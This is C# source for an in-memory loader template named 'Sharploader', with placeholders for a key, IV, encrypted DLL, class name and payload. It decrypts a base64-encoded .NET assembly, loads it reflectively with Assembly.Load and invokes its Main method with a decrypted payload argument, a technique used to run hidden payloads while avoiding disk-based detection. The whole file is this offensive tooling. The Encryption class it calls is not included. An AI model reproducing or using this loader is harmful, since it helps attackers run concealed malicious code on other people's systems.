using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.IO;

namespace Sharploader {

	public class Execute {

		public Execute() {
			Program.Main();
		}

	}
	public class Program {

		static string key = "%key%";
		static string iv = "%iv%";
		static string dll_class = "%dll_class%";
		static string dll = "%dll%";
		static string payload = "%payload%";

		static bool eCode(string[] codeArgs, string code) {

			var b = Convert.FromBase64String(code);
			var a = System.Reflection.Assembly.Load(b);

			Type type = a.GetType(String.Format("{0}", dll_class));
			Console.WriteLine(String.Format("[+] Found and Loaded type {0} from code", type));
			object instance = Activator.CreateInstance(type);
			object[] args = new object[] { codeArgs };
			try {
				type.GetMethod("Main").Invoke(instance, args);
			} catch (Exception e) { Console.WriteLine("[-] Error loading assembly!\n\n{0}",e); }
			
			return true;
		}

		public static void Main() {

			Encryption enc = new Encryption(key, iv);

			var dll_d = enc.decrypt(dll);
			string[] args = new string[] { enc.decrypt(payload), %params% };
			eCode(args, dll_d);

		}
	}
}
